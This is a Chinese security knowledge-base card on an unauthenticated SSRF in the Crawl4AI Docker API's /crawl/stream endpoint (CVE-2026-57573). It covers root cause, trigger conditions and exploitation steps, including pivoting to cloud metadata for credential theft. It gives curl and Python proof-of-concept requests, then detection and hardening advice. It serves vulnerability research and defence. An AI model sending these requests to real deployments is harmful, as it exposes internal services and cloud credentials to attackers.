---
id: web-generic-ssrf-crawl4ai-stream-endpoint-unauth
title: Crawl4AI /crawl/stream 未授权 SSRF：流式端点绕过 validate_url_destination（CVE-2026-57573）
type: scenario
domain: web
path: web/generic/ssrf
technique: crawl4ai-stream-endpoint-ssrf
tags:
- web
- ssrf
- crawl4ai
- fastapi
- docker
- unauth
- internal-network
- cve-2026-57573
cve:
- CVE-2026-57573
severity: high
confidence: high
affected_versions: Crawl4AI Docker API Server < 0.9.0（原文；PyPI 版本不受影响，SSRF 仅存在于 Docker 部署版）
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V28
  verified_at: '2026-11-05T03:12:25+08:00'
  notes: 已对照原文与3张截图核对：/crawl 对 host.docker.internal:9999 返回 SSRF protection 拦截（图02，HTTP500 内含400 detail），/crawl/stream 同 payload 返回200且 html/cleaned_html 含 SECRET:AKIA123456TOKEN（图03）；影响<0.9.0、PyPI不受影响、默认无认证均与原文一致。CVE/版本按原文记录，未独立核验；PoC未执行。
url: /docs/web/generic/ssrf/web-generic-ssrf-crawl4ai-stream-endpoint-unauth/
draft: false
kb_aliases:
- Crawl4AI SSRF
- CVE-2026-57573
- /crawl/stream SSRF
- 流式爬取 SSRF
- Crawl4AI 未授权访问
- 端点校验不一致 SSRF
---

## 一句话结论

Crawl4AI 的 Docker API 在普通 `/crawl` 端点调用 `validate_url_destination()` 做 SSRF 校验，但流式端点 `/crawl/stream` 走的 `handle_stream_crawl_request()` 没有该校验；在默认未设置 `CRAWL4AI_API_TOKEN` 的部署中，任何能访问 API 端口的人都能让容器请求内网/宿主机服务，并把响应内容通过流式 JSON 完整读回。

## 原理

- Crawl4AI 的 SSRF 防护由 `deploy/docker/utils.py` 的 `validate_url_destination()` 与 `validate_webhook_url()` 组成：
  - `ALLOW_INTERNAL_URLS` 为真时直接放行（调试用）；
  - `raw:`/`raw://` 内联 HTML 不发起网络请求，直接放行；
  - 其余 URL 先查内部主机名黑名单（`localhost`、`metadata.google.internal`、`metadata`、`kubernetes.default` 等，并对 `host.docker.internal` 做前缀匹配），再用 `socket.getaddrinfo` 解析所有地址，逐个判断 `ipaddress.ip_address(...).is_global`；对 IPv4-mapped IPv6、NAT64、6to4 等格式做展开后再判断。
- 普通端点 `handle_crawl_request()` 在爬取前会 `for url in urls: validate_url_destination(url)`；流式端点 `handle_stream_crawl_request()` 在漏洞版本中没有这段调用，`urls` 被原样传给 `AsyncWebCrawler`，响应通过 `StreamingResponse` 返回。
- `server.py` 的 `/crawl` 路由在 `crawler_config.stream` 为真时也会走 `stream_process()`，因此“`/crawl` + streaming 配置”同样可能绕过校验；`/crawl/stream` 是直接入口。`/md`、`/llm` 等端点走受保护路径。
- 认证方面：`server.py` 在未设置 `CRAWL4AI_API_TOKEN` 时只打印警告，不启用任何认证；这是默认配置，不是独立漏洞，但把 SSRF 利用门槛降为零。
- 最终数据流：`POST /crawl/stream {"urls":["http://host.docker.internal:9999/"]}` → `crawl_stream()`（只检查 hooks）→ `stream_process()` → `handle_stream_crawl_request()`（无校验）→ 爬虫发起 HTTP 请求 → 内网响应进入 `html`/`cleaned_html` 等字段流式返回。

## 触发条件

- 目标运行 Crawl4AI Docker API Server < 0.9.0（原文；PyPI 包不受影响，仅 Docker 部署版）。
- API 端口（默认 11235）对攻击者可达；未设置 `CRAWL4AI_API_TOKEN` 或 token 可绕过（默认无认证）。
- 目标容器能访问攻击者指定的内网地址（如 `host.docker.internal`、`127.0.0.1` 以外的内网 IP、云元数据 `169.254.169.254`）。
- `/crawl/stream` 未被网关/WAF 额外限制，且返回流式响应。
- `ALLOW_INTERNAL_URLS` 未开启（若开启则所有端点都放行，问题更大）。

## 利用步骤

1. 访问 `/health` 确认 Crawl4AI API 存活（`{"status":"ok"}`）；观察是否需要 `Authorization`，默认无认证。
2. 先用受保护的 `/crawl` 请求内网地址，确认返回 `URL blocked (SSRF protection)`，证明校验存在。
3. 用同一 payload 请求 `/crawl/stream`；若返回 200 且 `html`/`cleaned_html` 中出现内网服务内容，SSRF 成立。
4. 将 URL 换成云元数据、内网管理接口、Redis/Elasticsearch HTTP 接口等目标；根据响应内容提取凭证/数据。
5. 若目标只允许出网域名，尝试 `host.docker.internal`、内网 IP、IPv6 映射地址等（注意防护函数会展开 IPv6，实际以目标版本为准）。
6. 记录请求/响应，确认无需任何 token。

## PoC

```bash
# 1) 受保护端点：应被拦截
curl -s -X POST http://target:11235/crawl \
  -H "Content-Type: application/json" \
  -d '{"urls":["http://host.docker.internal:9999/test"]}'
# 预期：{"detail":"...URL blocked (SSRF protection)..."}

# 2) 流式端点：读取内网数据
curl -s -X POST http://target:11235/crawl/stream \
  -H "Content-Type: application/json" \
  -d '{"urls":["http://host.docker.internal:9999/test"]}'
# 预期：{"url":"http://host.docker.internal:9999/test",
#        "html":"...SECRET:AKIA123456TOKEN...", "status_code":200, ...}
```

```python
import requests

TARGET = "http://target:11235"
PAYLOAD = {"urls": ["http://host.docker.internal:9999/test"]}

r1 = requests.post(f"{TARGET}/crawl", json=PAYLOAD)
print("protected:", r1.status_code, "blocked" in r1.text or "SSRF" in r1.text)

r2 = requests.post(f"{TARGET}/crawl/stream", json=PAYLOAD)
print("stream:", r2.status_code, "SECRET" in r2.text)
```

```text
环境要点（原文）：
- 漏洞镜像：unclecode/crawl4ai:0.8.7；修复版本 0.9.0。
- 目标容器用 --add-host host.docker.internal:host-gateway 访问宿主机内网靶标；
  127.0.0.1 在容器内指容器自身，不能模拟宿主内网。
- 内网靶标可返回模拟云凭证，验证 /crawl/stream 能完整读取。
```

## 变体与关联

- 变体：`/crawl` 在请求配置 `stream=true` 时也走 `stream_process()`，同样缺少校验；`/crawl/stream` 只是最直接的入口。
- 变体：`/md`、`/llm` 等端点走 `handle_crawl_request()`，通常有校验；应逐个端点对比是否调用 `validate_url_destination`。
- 变体：目标可访问云元数据（`169.254.169.254`、`metadata.google.internal`）时，SSRF 可升级为临时凭证窃取；本文用宿主机模拟内网服务。
- 关联卡片：`web/generic/ssrf` 下的云元数据/内网探测卡；[[cloud-metadata-ssrf-imdsv2-token-credential]]（IMDSv2 凭证获取）；[[web-generic-auth-...]]（默认无认证放大危害的通用问题）。
- 边界：升级到 0.9.0 后 `handle_stream_crawl_request()` 增加 `_normalize_and_validate_seeds()`，本链失效；设置 `CRAWL4AI_API_TOKEN` 只提高门槛，不修复 SSRF；目标容器无内网路由或出站被防火墙阻断时无法读取。

## 检测与防御

- 检测：`POST /crawl/stream` 请求体 `urls` 含内网 IP、`host.docker.internal`、`localhost`、`169.254.169.254`、`metadata.google.internal` 等；请求无 `Authorization`；响应 `html`/`cleaned_html` 出现内网服务内容；容器发起异常内网 HTTP 连接。
- 修复：升级 Crawl4AI Docker API Server 到 >= 0.9.0（流式路径加入 `_normalize_and_validate_seeds()`）。
- 加固：设置强随机 `CRAWL4AI_API_TOKEN` 并强制认证；API 端口只绑定 `127.0.0.1` 或置于内网/网关后；容器出站用防火墙阻断 RFC1918、链路本地、云元数据地址；对所有接受 URL 的端点统一调用目的地校验（DNS 解析后按 IP 判断，处理重定向与 IPv6 映射）。
- 审计：搜索代码中直接 `requests.get`/`httpx`/`urllib` 但未调用 `validate_url_destination` 的路径；对比同一功能的所有端点（普通/流式/批量/回调）是否共用校验。
